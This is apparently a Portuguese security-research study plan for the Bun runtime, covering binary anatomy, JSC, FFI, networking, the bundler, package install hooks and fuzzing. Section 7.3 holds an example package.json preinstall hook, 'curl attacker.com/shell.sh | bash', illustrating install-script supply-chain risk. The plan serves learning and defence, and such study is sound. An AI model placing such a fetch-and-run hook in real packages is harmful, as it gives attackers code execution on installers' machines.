# STUDY_PATH — Trilha Linear: Binario → Exploit

> Caminho linear unico, do binario compilado ate exploit development.
>
> Companion files: [`README.md`](./README.md) · [`CVE_INTEL.md`](./CVE_INTEL.md) · [`PAPERS.md`](./PAPERS.md) · [`LAB_SETUP.md`](./LAB_SETUP.md)

---

## Rationale

Duas premissas estruturam a trilha:

1. **Bun e um binario monolitico** — runtime + bundler + package manager em um unico executavel. Entender o binario e pre-requisito de tudo.
2. **JSC (JavaScriptCore) e o coracao** — o mesmo engine do Safari. JIT compilation = attack surface principal.

Cruzamentos obrigatorios:
- `runtime/02-zig-runtime` ↔ `reverse/04-zig-specific` (patterns Zig no assembly)
- `runtime/03-jsc-integration` ↔ `security/02-sandbox` (JSC JIT = code injection surface)
- `ffi/01-bun-ffi` ↔ `security/01-attack-surface` (FFI = escape hatch)
- `package/04-hooks` ↔ `security/03-supply-chain` (install scripts = RCE)

Tempo total: **~200-250h** (1-2h/dia ≈ 6-8 meses; 3-4h/dia ≈ 3 meses).

---

## Fase 0 — Setup (2-4h)

**Leitura:** [`README.md`](./README.md) · [`LAB_SETUP.md`](./LAB_SETUP.md) · [`CVE_INTEL.md`](./CVE_INTEL.md).

**Obter binario:**
```bash
# Release build (stripped)
curl -fsSL https://bun.sh/install | bash
which bun && bun --version

# Debug build (symbols, slow)
git clone https://github.com/oven-sh/bun
cd bun && zig build -Doptimize=Debug
```

**Tools:**
- binutils: `objdump`, `nm`, `readelf`, `strings`
- debugging: `gdb`, `lldb`, `strace`, `ltrace`
- disassembly: `radare2`, `rizin`, `ghidra`
- security: `checksec`, `pwntools`
- instrumentation: `frida`, `bpftrace`

**Checkpoint:** `checksec --file=$(which bun)` mostra PIE, RELRO, stack canary status.

---

## Fase 1 — Binary Anatomy (~25h)

Ordem: [`runtime/01-binary-layout`](./runtime/01-binary-layout/) → [`reverse/01-static`](./reverse/01-static/) → [`reverse/04-zig-specific`](./reverse/04-zig-specific/).

### 1.1 ELF Structure

```bash
# Headers
readelf -h $(which bun)

# Sections (.text, .rodata, .data, .bss)
readelf -S $(which bun)

# Program headers (LOAD, GNU_STACK, etc)
readelf -l $(which bun)

# Dynamic symbols
readelf -d $(which bun) | head -30

# Size analysis
size $(which bun)
```

### 1.2 Symbol Analysis

```bash
# Exported symbols (minimal in release)
nm -D $(which bun) | head -50

# All symbols (debug build only)
nm $(which bun) 2>/dev/null | wc -l

# Interesting function names
objdump -t $(which bun) 2>/dev/null | grep -E "(main|init|ffi|eval)" | head -20
```

### 1.3 Zig Patterns

Zig compila para LLVM IR, depois para native. Patterns reconheciveis:
- Safety checks: bounds checking antes de array access
- Panic handlers: `@panic` vira call para handler especifico
- Comptime: codigo resolvido em compile-time desaparece
- Extern: funcoes C chamadas via symbol resolution normal

**Checkpoint:** identificar no `objdump` onde Zig insere bounds checking vs onde nao insere.

---

## Fase 2 — Runtime Core (~35h)

Ordem: [`runtime/02-zig-runtime`](./runtime/02-zig-runtime/) → [`runtime/03-jsc-integration`](./runtime/03-jsc-integration/) → [`runtime/04-event-loop`](./runtime/04-event-loop/).

### 2.1 Zig Runtime

Arquivos-chave no repo `oven-sh/bun`:
```
src/
├── bun.zig           # Entry point
├── runtime.zig       # Core runtime
├── allocator.zig     # Memory allocation
└── panic_handler.zig # Crash handling
```

Analisar:
- Como `main` inicializa
- Qual allocator e usado (mimalloc customizado)
- Como panics sao tratados

### 2.2 JSC Integration

JavaScriptCore do WebKit, embeddado:
- JIT tiers: LLInt → Baseline → DFG → FTL
- GC: generational, concurrent marking
- Builtins: Date, RegExp, etc implementados em C++

Arquivos-chave:
```
src/
├── jsc/              # JSC bindings
├── js_ast.zig        # JS AST representation
└── eval.zig          # Script evaluation
```

### 2.3 Event Loop

Bun usa implementacao propria (nao libuv):
- Linux: io_uring quando disponivel, epoll fallback
- macOS: kqueue
- Windows: IOCP

```bash
# Ver syscalls de I/O
strace -e epoll_wait,io_uring_enter bun run server.js 2>&1
```

**Checkpoint:** tracing de `bun run script.js` do `execve` ate `exit`, entender cada syscall.

---

## Fase 3 — Memory Subsystem (~25h)

Ordem: [`memory/01-allocator`](./memory/01-allocator/) → [`memory/02-gc`](./memory/02-gc/) → [`memory/03-buffers`](./memory/03-buffers/) → [`memory/04-safety`](./memory/04-safety/).

### 3.1 Allocator (mimalloc)

Bun usa fork customizado do mimalloc:
- Arenas por thread
- Free lists compactas
- Page-based allocation

```bash
# Ver allocations
strace -e mmap,munmap,brk bun run script.js 2>&1 | head -30

# Memory maps
cat /proc/$(pgrep bun)/maps
```

### 3.2 JSC Garbage Collector

- Generational: young → old generation
- Concurrent marking (nao para o mundo completamente)
- Weak references vs strong
- FinalizationRegistry

### 3.3 Buffers

```javascript
// ArrayBuffer - native memory
const buf = new ArrayBuffer(1024);

// SharedArrayBuffer - shared across workers
const shared = new SharedArrayBuffer(1024);

// Bun-specific: bun:buffer
import { Buffer } from "bun";
```

**Security note:** SharedArrayBuffer + Spectre = timing attacks.

### 3.4 Memory Safety

Onde Bun pode ter vulnerabilidades:
- Zig → C interop (FFI boundaries)
- JSC C++ code (historical CVEs)
- Native bindings sem bounds checking
- Use-after-free em closures/callbacks

**Checkpoint:** identificar no source onde ha raw pointer manipulation sem safety checks.

---

## Fase 4 — FFI & Syscalls (~30h)

Ordem: [`ffi/01-bun-ffi`](./ffi/01-bun-ffi/) → [`ffi/04-syscalls`](./ffi/04-syscalls/) → [`ffi/02-native-plugins`](./ffi/02-native-plugins/) → [`ffi/03-zig-bindings`](./ffi/03-zig-bindings/).

### 4.1 Bun:FFI

```javascript
import { dlopen, suffix, ptr } from "bun:ffi";

// Load shared library
const lib = dlopen(`./libexample.${suffix}`, {
  add: {
    args: ["i32", "i32"],
    returns: "i32",
  },
});

// Direct call - NO SANDBOX
const result = lib.symbols.add(1, 2);
```

**CRITICAL:** FFI e escape hatch completo. Qualquer codigo com acesso a `bun:ffi` tem acesso ao sistema.

### 4.2 Syscall Interface

```javascript
// Experimental: direct syscalls
import { syscall } from "bun";

// read(fd, buf, count)
const result = syscall(0, fd, bufPtr, 1024);
```

### 4.3 Native Plugins (N-API)

Compatibilidade com modulos Node.js nativos:
```bash
# Ver quais .node files sao carregados
strace -e openat bun run script.js 2>&1 | grep "\.node"
```

**Checkpoint:** criar shared library em C, carregar via FFI, executar syscall arbitrario.

---

## Fase 5 — HTTP & Network Stack (~25h)

Ordem: [`http/01-server`](./http/01-server/) → [`http/02-fetch`](./http/02-fetch/) → [`http/04-tls`](./http/04-tls/) → [`http/03-websocket`](./http/03-websocket/).

### 5.1 HTTP Server (uWebSockets)

Bun usa uWebSockets.js (C++):
```javascript
Bun.serve({
  port: 3000,
  fetch(req) {
    return new Response("Hello");
  },
});
```

Internamente:
- Parser HTTP escrito em C++
- Zero-copy onde possivel
- Backpressure handling

### 5.2 Fetch Implementation

```javascript
// Uses BoringSSL for TLS
const res = await fetch("https://example.com");
```

### 5.3 TLS Stack (BoringSSL)

- Fork do OpenSSL pelo Google
- Certificados: system store ou custom
- MITM detection: certificate pinning nao e default

```bash
# Ver handshake TLS
strace -e read,write bun -e 'fetch("https://example.com")' 2>&1 | head -50
```

**Checkpoint:** capturar traffic de `fetch` com Wireshark, analisar handshake TLS.

---

## Fase 6 — Bundler & Transpiler (~20h)

Ordem: [`bundler/01-parser`](./bundler/01-parser/) → [`bundler/02-ast`](./bundler/02-ast/) → [`bundler/03-tree-shaking`](./bundler/03-tree-shaking/).

### 6.1 Parser

Parser JS/TS escrito em Zig (nao usa Babel/swc):
```
src/
├── js_parser.zig     # Main parser
├── js_lexer.zig      # Tokenizer
└── js_ast.zig        # AST nodes
```

Implicacoes de seguranca:
- Parser bugs → code injection
- Unicode handling → homograph attacks
- Regex parsing → ReDoS

### 6.2 AST

```bash
# Ver AST de um arquivo
bun build --dump-ast script.js
```

### 6.3 Tree Shaking

Dead code elimination:
- Import tracking
- Side effect analysis
- Export pruning

**Checkpoint:** criar input que causa parser error interessante (edge case Unicode, etc).

---

## Fase 7 — Package Manager (~20h)

Ordem: [`package/01-registry`](./package/01-registry/) → [`package/02-lockfile`](./package/02-lockfile/) → [`package/04-hooks`](./package/04-hooks/) → [`package/03-cache`](./package/03-cache/).

### 7.1 Registry Protocol

```bash
# Ver requests ao registry
strace -e connect,sendto bun install 2>&1 | grep -E "registry|npm"

# Bun usa npm registry por padrao
curl -s https://registry.npmjs.org/express | jq .name
```

### 7.2 Lockfile (bun.lockb)

Formato binario proprietario:
```bash
# Nao e texto como package-lock.json
file bun.lockb
hexdump -C bun.lockb | head -20
```

### 7.3 Install Hooks

**CRITICAL ATTACK SURFACE:**
```json
{
  "scripts": {
    "preinstall": "curl attacker.com/shell.sh | bash",
    "postinstall": "node malicious.js"
  }
}
```

Bun executa lifecycle scripts por padrao. Mitigacao:
```bash
bun install --ignore-scripts
```

### 7.4 Cache Structure

```bash
# Global cache location
ls -la ~/.bun/install/cache/

# Package contents
ls ~/.bun/install/cache/express@*/
```

**Checkpoint:** criar package malicioso com postinstall, testar em sandbox.

---

## Fase 8 — Security & Exploitation (~50h)

Ordem: [`security/01-attack-surface`](./security/01-attack-surface/) → [`security/02-sandbox`](./security/02-sandbox/) → [`security/03-supply-chain`](./security/03-supply-chain/) → [`security/04-cve-analysis`](./security/04-cve-analysis/) → [`security/05-fuzzing`](./security/05-fuzzing/).

### 8.1 Attack Surface

| Surface | Risk | Mitigation |
|---------|------|------------|
| FFI | Critical | Avoid in untrusted code |
| Install scripts | Critical | `--ignore-scripts` |
| JSC JIT | High | JIT hardening (built-in) |
| Parser | Medium | Fuzz testing |
| Network | Medium | TLS verification |

### 8.2 Sandbox (or lack thereof)

**Bun tem ZERO sandboxing por padrao:**
- Filesystem: acesso total
- Network: acesso total
- Processes: pode spawnar
- FFI: acesso direto a memoria

Comparacao:
| Runtime | Sandbox |
|---------|---------|
| Deno | Yes (permissions) |
| Node.js | Experimental |
| Bun | No |
| Browser | Yes (strong) |

### 8.3 Supply Chain

Vetores de ataque:
1. Typosquatting (`loadsh` vs `lodash`)
2. Dependency confusion
3. Compromised maintainer
4. Install script RCE

### 8.4 CVE Analysis

Ver [`CVE_INTEL.md`](./CVE_INTEL.md) para lista completa.

Metodologia:
1. Ler advisory
2. Encontrar commit de fix
3. Entender root cause
4. Verificar se variante existe
5. Escrever PoC

### 8.5 Fuzzing

```bash
# Build com ASAN
cd bun && zig build -Doptimize=ReleaseSafe -Dsanitize=address

# Fuzz parser
afl-fuzz -i corpus/ -o findings/ ./bun-asan build --dump-ast @@

# Fuzz HTTP parser
cat corpus/*.http | ./bun-asan serve --dry-run
```

**Checkpoint:** encontrar crash novo via fuzzing ou code review, reportar responsavelmente.

---

## Verificacao end-to-end

| Fase | Verificacao |
|------|-------------|
| 0 | `checksec` mostra security features do binario |
| 1 | Explicar output de `readelf -S` linha por linha |
| 2 | Tracing de `bun run` do execve ao exit |
| 3 | Identificar memory leak potencial no source |
| 4 | FFI call para syscall arbitrario funciona |
| 5 | Captura de TLS handshake decodificada |
| 6 | Input malformado causa parser error controlado |
| 7 | Package com hook malicioso executa em sandbox |
| 8 | Crash via fuzzing OU CVE reproduzido |

---

## Pivos (nao pular)

- `runtime/01-binary-layout` — gateway de tudo
- `runtime/03-jsc-integration` — coracao do runtime
- `ffi/01-bun-ffi` — escape hatch principal
- `security/02-sandbox` — entender o que NAO existe
- `package/04-hooks` — supply chain e real

## Skills/tools ativos na trilha

`objdump` · `readelf` · `nm` · `strings` · `strace` · `ltrace` · `gdb` · `radare2` · `checksec` · `frida` · `afl++`

## Repositorios de referencia

- [oven-sh/bun](https://github.com/oven-sh/bun) — source code
- [WebKit/WebKit](https://github.com/WebKit/WebKit) — JSC source
- [libuv/libuv](https://github.com/libuv/libuv) — comparacao event loop
- [nicolo-ribaudo/bun-lockb-parser](https://github.com/nicolo-ribaudo/bun-lockb-parser) — lockfile reverse

## Timeline estimada

| Fase | Horas | Cumulative |
|------|-------|------------|
| 0 | 4 | 4h |
| 1 | 25 | 29h |
| 2 | 35 | 64h |
| 3 | 25 | 89h |
| 4 | 30 | 119h |
| 5 | 25 | 144h |
| 6 | 20 | 164h |
| 7 | 20 | 184h |
| 8 | 50 | 234h |

**Total: ~234h** (1h/dia = 8 meses, 2h/dia = 4 meses, full-time = 6 semanas)
